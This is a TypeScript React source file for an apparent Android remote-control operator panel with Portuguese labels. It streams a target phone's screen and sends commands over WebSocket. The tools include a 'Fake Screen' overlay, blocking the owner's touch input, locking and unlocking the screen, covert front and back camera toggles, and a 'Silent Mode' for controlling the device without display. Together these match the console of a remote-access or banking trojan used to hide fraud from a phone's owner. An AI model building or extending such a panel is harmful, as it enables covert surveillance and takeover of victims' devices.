import { useEffect, useRef, useState } from "react";
import { useLocation, useParams } from "wouter";
import { useAuth } from "@/lib/auth";
import { useDeviceWebSocket } from "@/hooks/use-websocket";
import {
  Settings, Type, Camera, LayoutGrid, Eye,
  MousePointer, Lock, LockOpen, Keyboard,
  Shield, Volume2, VolumeX, Monitor, Play, StopCircle,
  ChevronLeft, ChevronDown, Wifi, Battery,
  RefreshCw, Maximize2, RotateCcw, Ban, Check,
  Hand, AlignJustify,
} from "lucide-react";

/* ─── Device registry (mock until real device connects) ─────────── */
interface Device { id: string; name: string; battery: number; version: string; }
const DEVICES: Record<string, Device> = {
  d1: { id: "d1", name: "Samsung Galaxy A54",  battery: 78, version: "v4.5.4" },
  d2: { id: "d2", name: "Motorola Edge 30",     battery: 42, version: "v4.5.4" },
  d3: { id: "d3", name: "Xiaomi Redmi Note 12", battery: 10, version: "v4.5.3" },
};

/* ─── Sidebar tool definitions ───────────────────────────────────── */
interface ToolDef {
  id: string; icon: React.ElementType; label: string;
  cmd?: string; toggle?: boolean; danger?: boolean; divider?: boolean;
}
const LIVE_TOOLS: ToolDef[] = [
  { id: "eye",      icon: Eye,         label: "Fake Screen",      cmd: "toggle_overlay",     toggle: true  },
  { id: "ban",      icon: Ban,         label: "Bloquear Touch",   cmd: "toggle_touch_block", toggle: true, danger: true },
  { id: "lock",     icon: Lock,        label: "Bloquear Tela",    cmd: "lock_screen"    },
  { id: "lockopen", icon: LockOpen,    label: "Desbloquear Tela", cmd: "unlock_screen"  },
  { id: "camera-f", icon: Camera,      label: "Câmera Frontal",   cmd: "camera_front",       toggle: true  },
  { id: "camera-b", icon: RotateCcw,   label: "Câmera Traseira",  cmd: "camera_back",        toggle: true  },
  { id: "settings", icon: Settings,    label: "Configurações", divider: true },
  { id: "text",     icon: Type,        label: "Texto" },
  { id: "grid",     icon: LayoutGrid,  label: "Grid" },
  { id: "cursor",   icon: MousePointer,label: "Cursor Remoto" },
  { id: "keyboard", icon: Keyboard,    label: "Teclado" },
  { id: "shield",   icon: Shield,      label: "Proteção" },
  { id: "volume",   icon: Volume2,     label: "Volume" },
  { id: "mute",     icon: VolumeX,     label: "Mudo" },
  { id: "monitor",  icon: Monitor,     label: "Monitor" },
];

/* ─── Battery indicator ──────────────────────────────────────────── */
function BatteryIcon({ pct }: { pct: number }) {
  const c = pct > 30 ? "text-[#00ff9d]" : pct > 15 ? "text-yellow-400" : "text-red-400";
  return (
    <span className={`flex items-center gap-0.5 text-[10px] font-mono font-bold ${c}`}>
      <Battery className="w-3 h-3" />{pct}%
    </span>
  );
}

/* ─── Main component ─────────────────────────────────────────────── */
export default function LiveScreen() {
  const { isAuthenticated } = useAuth();
  const [, setLocation]     = useLocation();
  const params   = useParams<{ deviceId: string }>();
  const deviceId = params.deviceId ?? "d1";
  const device   = DEVICES[deviceId] ?? { id: deviceId, name: "Dispositivo", battery: 0, version: "v0.0.0" };

  const canvasRef = useRef<HTMLCanvasElement>(null);

  /* Stream mode: "live" = show video | "silent" = commands active, no render */
  const [streamMode,       setStreamMode]       = useState<"live" | "silent">("live");
  const [modeDropdownOpen, setModeDropdownOpen] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  /* Sidebar toggle state */
  const [activeTools, setActiveTools] = useState<Set<string>>(new Set());

  /* Command feedback toast */
  const [cmdFeedback, setCmdFeedback]  = useState<string | null>(null);
  const feedbackTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const { status, frameUrl, stats, startStream, stopStream, streaming, sendCommand } =
    useDeviceWebSocket(deviceId);

  /* Draw JPEG frame onto canvas */
  useEffect(() => {
    if (!frameUrl || !canvasRef.current) return;
    const img = new Image();
    img.onload = () => {
      const canvas = canvasRef.current;
      if (!canvas) return;
      const ctx = canvas.getContext("2d");
      if (!ctx) return;
      canvas.width  = img.naturalWidth;
      canvas.height = img.naturalHeight;
      ctx.drawImage(img, 0, 0);
    };
    img.src = frameUrl;
  }, [frameUrl]);

  /* Close dropdown on outside click */
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setModeDropdownOpen(false);
      }
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  useEffect(() => {
    if (!isAuthenticated) setLocation("/login");
  }, [isAuthenticated, setLocation]);

  if (!isAuthenticated) return null;

  const wsConnected  = status === "connected";
  const wsConnecting = status === "connecting";

  /* Handle sidebar tool click */
  function handleTool(tool: ToolDef) {
    if (!tool.cmd) return;
    const isOn = activeTools.has(tool.id);
    sendCommand(tool.cmd, { targetDeviceId: deviceId });
    if (tool.toggle) {
      setActiveTools(prev => {
        const s = new Set(prev);
        if (s.has(tool.id)) s.delete(tool.id); else s.add(tool.id);
        return s;
      });
    }
    const verb  = tool.toggle ? (isOn ? "Desativado" : "Ativado") : "Enviado";
    const label = `${verb}: ${tool.label}`;
    setCmdFeedback(label);
    if (feedbackTimer.current) clearTimeout(feedbackTimer.current);
    feedbackTimer.current = setTimeout(() => setCmdFeedback(null), 2500);
  }

  const hasFrames    = streaming && !!frameUrl;
  const silentMode   = streamMode === "silent";

  return (
    <div className="flex h-screen w-full bg-[#080c14] text-foreground overflow-hidden">

      {/* ══════════════ LEFT SIDEBAR ══════════════ */}
      <aside className="w-[52px] flex-shrink-0 bg-[#0a0e1a] border-r border-primary/10 flex flex-col items-center gap-0.5 py-2 z-20 overflow-y-auto">
        {LIVE_TOOLS.map(tool => {
          const isOn     = activeTools.has(tool.id);
          const isDanger = tool.danger && isOn;
          return (
            <div key={tool.id} className="w-full flex flex-col items-center">
              {tool.divider && <div className="w-7 h-px bg-primary/10 my-1.5" />}
              <button
                title={tool.label}
                onClick={() => handleTool(tool)}
                className={`relative w-9 h-9 rounded-lg flex items-center justify-center transition-all border
                  ${isDanger
                    ? "text-red-400 bg-red-500/15 border-red-500/30 shadow-[0_0_10px_rgba(239,68,68,0.3)]"
                    : isOn && tool.toggle
                      ? "text-primary bg-primary/20 border-primary/40 shadow-[0_0_10px_rgba(0,212,255,0.4)]"
                      : tool.cmd
                        ? "text-muted-foreground/60 border-transparent hover:text-primary hover:bg-primary/10 hover:border-primary/20"
                        : "text-muted-foreground/40 border-transparent hover:text-primary/50"
                  }`}
              >
                <tool.icon className="w-4 h-4" />
                {isOn && tool.toggle && (
                  <span className={`absolute -top-0.5 -right-0.5 w-2 h-2 rounded-full border-2 border-[#0a0e1a]
                    ${isDanger ? "bg-red-400" : "bg-primary shadow-[0_0_4px_rgba(0,212,255,0.9)]"}`} />
                )}
              </button>
            </div>
          );
        })}
      </aside>

      {/* ══════════════ MAIN AREA ══════════════ */}
      <main className="flex-1 flex flex-col overflow-hidden min-w-0">

        {/* ── Top bar ─────────────────────────────────────────── */}
        <div className="flex items-center gap-2 px-3 py-2 border-b border-primary/10 bg-[#0a0e1a]/95 backdrop-blur flex-shrink-0">

          {/* Mode dropdown */}
          <div ref={dropdownRef} className="relative">
            <button
              onClick={() => setModeDropdownOpen(v => !v)}
              className="flex items-center gap-1.5 h-8 px-3 rounded-lg border border-primary/25 bg-primary/8 hover:bg-primary/15 transition-all"
            >
              <span className={`w-1.5 h-1.5 rounded-full ${wsConnected ? "bg-[#00ff9d] shadow-[0_0_5px_rgba(0,255,157,0.9)]" : wsConnecting ? "bg-yellow-400 animate-pulse" : "bg-red-500/70"}`} />
              <span className="font-orbitron text-[11px] font-bold text-primary tracking-widest"
                style={{ textShadow: "0 0 8px rgba(0,212,255,0.5)" }}>
                TELA AO VIVO
              </span>
              <ChevronDown className={`w-3 h-3 text-primary/60 transition-transform ${modeDropdownOpen ? "rotate-180" : ""}`} />
            </button>

            {modeDropdownOpen && (
              <div className="absolute left-0 top-full mt-1 w-44 bg-[#0d1220] border border-primary/20 rounded-xl shadow-2xl overflow-hidden z-50"
                style={{ boxShadow: "0 8px 32px rgba(0,0,0,0.6), 0 0 0 1px rgba(0,212,255,0.1)" }}>
                {[
                  { id: "live",   label: "Live Screen",  desc: "Exibe o vídeo em tempo real" },
                  { id: "silent", label: "Silent Mode",  desc: "Controla sem renderizar vídeo" },
                ].map(m => (
                  <button key={m.id}
                    onClick={() => { setStreamMode(m.id as "live"|"silent"); setModeDropdownOpen(false); }}
                    className={`w-full flex flex-col items-start px-3 py-2.5 text-left transition-all
                      ${streamMode === m.id ? "bg-primary/15 text-primary" : "text-muted-foreground/70 hover:bg-primary/8 hover:text-primary"}`}
                  >
                    <span className="text-xs font-orbitron font-bold tracking-wider flex items-center gap-1.5">
                      {streamMode === m.id && <Check className="w-3 h-3" />}
                      {m.label}
                    </span>
                    <span className="text-[10px] text-muted-foreground/50 mt-0.5">{m.desc}</span>
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* INICIAR / PARAR button */}
          {!streaming ? (
            <button onClick={startStream}
              className="flex items-center gap-1.5 h-8 px-4 rounded-lg bg-primary/15 border border-primary/50 text-primary text-[11px] font-orbitron font-bold tracking-wider hover:bg-primary/25 transition-all"
              style={{ boxShadow: "0 0 12px rgba(0,212,255,0.2)" }}>
              <Play className="w-3.5 h-3.5 fill-current" />
              PLAY STREAM
            </button>
          ) : (
            <button onClick={stopStream}
              className="flex items-center gap-1.5 h-8 px-4 rounded-lg bg-red-500/12 border border-red-500/50 text-red-400 text-[11px] font-orbitron font-bold tracking-wider hover:bg-red-500/20 transition-all">
              <StopCircle className="w-3.5 h-3.5" />
              PARAR
            </button>
          )}

          {/* Stats inline */}
          <div className="flex items-center gap-3 ml-1">
            <span className="flex items-center gap-1 text-[10px] font-mono">
              <Play className="w-2.5 h-2.5 text-primary/40" />
              <span className="text-foreground/70 font-bold">{stats.fps}</span>
              <span className="text-muted-foreground/40">FPS</span>
            </span>
            <span className="flex items-center gap-1 text-[10px] font-mono">
              <Wifi className="w-2.5 h-2.5 text-primary/40" />
              <span className={`font-bold ${stats.latencyMs === 0 ? "text-muted-foreground/50" : stats.latencyMs < 80 ? "text-[#00ff9d]" : stats.latencyMs < 200 ? "text-yellow-400" : "text-red-400"}`}>
                {stats.latencyMs}ms
              </span>
            </span>
            <BatteryIcon pct={device.battery} />
            <span className="flex items-center gap-1 text-[10px] font-orbitron">
              <span className={`w-1.5 h-1.5 rounded-full ${wsConnected ? "bg-[#00ff9d] shadow-[0_0_4px_rgba(0,255,157,0.9)]" : "bg-red-500/60"}`} />
              <span className={wsConnected ? "text-[#00ff9d]/70" : "text-muted-foreground/40"}>WS</span>
            </span>
          </div>

          <div className="flex-1" />

          {/* Command feedback toast */}
          {cmdFeedback && (
            <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg border border-[#00ff9d]/30 bg-[#00ff9d]/8 text-[10px] font-orbitron text-[#00ff9d] tracking-wider">
              <Check className="w-3 h-3" />
              {cmdFeedback}
            </div>
          )}
        </div>

        {/* ── Phone frame area ─────────────────────────────────── */}
        <div className="flex-1 flex items-center justify-center overflow-hidden bg-[#060a14] relative py-4">

          {/* ── Phone mockup ── */}
          <div
            className="relative flex-shrink-0"
            style={{
              width:       "clamp(220px, 28vw, 310px)",
              aspectRatio: "9 / 19.5",
            }}
          >
            {/* Outer bezel / phone body */}
            <div className="absolute inset-0 rounded-[36px] bg-[#111827] border-[3px] border-[#1e2a3a]"
              style={{ boxShadow: "0 0 0 1px rgba(0,212,255,0.08), 0 20px 60px rgba(0,0,0,0.7), inset 0 0 0 1px rgba(255,255,255,0.04)" }}>

              {/* Inner shadow on bezel */}
              <div className="absolute inset-[3px] rounded-[32px] overflow-hidden bg-black flex flex-col">

                {/* Status bar (fake phone status bar) */}
                <div className="h-[22px] bg-black flex items-center px-4 justify-between flex-shrink-0">
                  <span className="text-[8px] text-white/70 font-mono">16:49</span>
                  <div className="w-12 h-3 rounded-full bg-black border border-white/10" />
                  <div className="flex items-center gap-1">
                    <div className="w-3 h-2 border border-white/40 rounded-[1px] flex items-end pr-[1px] pb-[1px]">
                      <div className="w-full h-[60%] bg-white/60 rounded-[1px]" />
                    </div>
                  </div>
                </div>

                {/* ── Screen content ── */}
                <div className="flex-1 relative overflow-hidden bg-[#0a0a0a]"
                  style={{ height: "calc(100% - 22px - 16px)" }}>

                  {/* Live canvas — only shown in "live" mode */}
                  {hasFrames && !silentMode && (
                    <canvas
                      ref={canvasRef}
                      className="absolute inset-0 w-full h-full object-contain"
                      style={{ imageRendering: "auto" }}
                    />
                  )}

                  {/* Silent mode overlay */}
                  {streaming && silentMode && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 bg-[#0a0a0a]">
                      <div className="w-8 h-8 rounded-full border border-primary/20 flex items-center justify-center">
                        <Monitor className="w-4 h-4 text-primary/30" />
                      </div>
                      <span className="text-[9px] font-orbitron text-primary/40 tracking-widest">SILENT MODE</span>
                      <span className="text-[8px] text-muted-foreground/30">stream ativo</span>
                    </div>
                  )}

                  {/* Empty / waiting state */}
                  {!streaming && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center gap-3">
                      <div className="relative">
                        <div className="w-12 h-12 rounded-xl border border-primary/15 bg-primary/5 flex items-center justify-center">
                          <Monitor className="w-6 h-6 text-primary/30" style={{ filter: "drop-shadow(0 0 6px rgba(0,212,255,0.4))" }} />
                        </div>
                        {[0, 1].map(i => (
                          <div key={i} className="absolute rounded-xl border border-primary/8 animate-ping"
                            style={{ inset: `-${(i + 1) * 8}px`, animationDelay: `${i * 500}ms`, animationDuration: "2.5s" }} />
                        ))}
                      </div>
                      <div className="text-center">
                        <p className="text-[9px] text-muted-foreground/40 flex items-center gap-1 justify-center">
                          Pressione
                          <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded border border-primary/25 bg-primary/10 text-primary text-[8px] font-orbitron">
                            <Play className="w-2 h-2 fill-current" />PLAY
                          </span>
                          para iniciar
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Connecting indicator */}
                  {wsConnecting && !streaming && (
                    <div className="absolute bottom-2 left-0 right-0 flex justify-center">
                      <span className="text-[8px] text-yellow-400/60 font-mono animate-pulse">conectando...</span>
                    </div>
                  )}
                </div>

                {/* Home bar */}
                <div className="h-[16px] bg-black flex items-center justify-center">
                  <div className="w-20 h-1 rounded-full bg-white/15" />
                </div>
              </div>
            </div>

            {/* ── Refresh + Fullscreen buttons (top-right of phone) ── */}
            <div className="absolute -top-0 -right-9 flex flex-col gap-1">
              <button
                onClick={() => { if (streaming) { stopStream(); setTimeout(startStream, 200); } }}
                title="Reiniciar stream"
                className="w-7 h-7 rounded-lg bg-[#0d1220] border border-primary/15 text-muted-foreground/50 hover:text-primary hover:border-primary/40 flex items-center justify-center transition-all">
                <RefreshCw className="w-3 h-3" />
              </button>
              <button title="Tela cheia"
                className="w-7 h-7 rounded-lg bg-[#0d1220] border border-primary/15 text-muted-foreground/50 hover:text-primary hover:border-primary/40 flex items-center justify-center transition-all">
                <Maximize2 className="w-3 h-3" />
              </button>
            </div>

            {/* ── STREAM ATIVO badge (bottom-right) ── */}
            {streaming && (
              <div className="absolute -bottom-3 right-0 left-0 flex justify-end pr-1">
                <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg border"
                  style={{
                    background:   "rgba(0,212,255,0.12)",
                    borderColor:  "rgba(0,212,255,0.3)",
                    boxShadow:    "0 0 12px rgba(0,212,255,0.15)",
                  }}>
                  <span className="w-1.5 h-1.5 rounded-full bg-[#00ff9d] animate-pulse shadow-[0_0_5px_rgba(0,255,157,0.9)]" />
                  <span className="text-[9px] font-orbitron text-primary tracking-wider whitespace-nowrap">
                    STREAM ATIVO — MODO {streamMode === "live" ? "LIVE" : "SILENCIOSO"}
                  </span>
                </div>
              </div>
            )}

            {/* ── Active overlay badges (top of phone) ── */}
            {(activeTools.has("ban") || activeTools.has("eye")) && (
              <div className="absolute -top-8 left-0 right-0 flex items-center justify-center gap-1.5">
                {activeTools.has("eye") && (
                  <span className="flex items-center gap-1 px-2 py-0.5 rounded bg-primary/20 border border-primary/30 text-[8px] font-orbitron text-primary">
                    <Eye className="w-2.5 h-2.5" />FAKE SCREEN
                  </span>
                )}
                {activeTools.has("ban") && (
                  <span className="flex items-center gap-1 px-2 py-0.5 rounded bg-red-500/15 border border-red-500/30 text-[8px] font-orbitron text-red-400">
                    <Ban className="w-2.5 h-2.5" />TOUCH BLOQUEADO
                  </span>
                )}
              </div>
            )}
          </div>
        </div>

        {/* ── Quick controls bar ───────────────────────────────── */}
        <div className="flex items-center justify-center gap-2 py-2 border-t border-primary/8 bg-[#0a0e1a]/60 flex-shrink-0">
          {[
            { icon: Hand,         label: "Touch",     cmd: "toggle_touch_block", id: "ban"  },
            { icon: AlignJustify, label: "Teclado",   cmd: null },
            { icon: Settings,     label: "Config",    cmd: null },
          ].map((btn) => {
            const isOn = btn.id ? activeTools.has(btn.id) : false;
            return (
              <button key={btn.label}
                onClick={() => btn.cmd && sendCommand(btn.cmd, { targetDeviceId: deviceId })}
                className={`flex items-center gap-1.5 h-8 px-3 rounded-lg text-[10px] font-orbitron tracking-wider border transition-all
                  ${isOn
                    ? "text-primary bg-primary/15 border-primary/30"
                    : "text-muted-foreground/50 border-primary/10 hover:text-primary hover:bg-primary/8"
                  }`}>
                <btn.icon className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">{btn.label}</span>
              </button>
            );
          })}
        </div>

        {/* ── Bottom nav ────────────────────────────────────────── */}
        <div className="flex items-center px-3 py-2 border-t border-primary/10 bg-[#0a0e1a]/80 flex-shrink-0">
          <button onClick={() => setLocation("/")}
            className="flex items-center gap-1.5 h-7 px-3 rounded-lg border border-primary/15 text-primary/50 hover:text-primary hover:border-primary/35 hover:bg-primary/8 text-[10px] font-orbitron tracking-wider transition-all">
            <ChevronLeft className="w-3 h-3" />
            VOLTAR
          </button>
          <div className="flex-1 flex items-center justify-center gap-2">
            <span className="text-[10px] text-muted-foreground/40 font-mono truncate max-w-[180px]">{device.name}</span>
            <span className="text-muted-foreground/20">·</span>
            <span className="text-[10px] text-primary/40 font-mono">{device.version}</span>
            {!wsConnected && (
              <span className="text-[9px] text-red-400/60 font-mono">
                {wsConnecting ? "● conectando..." : "○ desconectado"}
              </span>
            )}
          </div>
          <div className="w-24" />
        </div>
      </main>
    </div>
  );
}
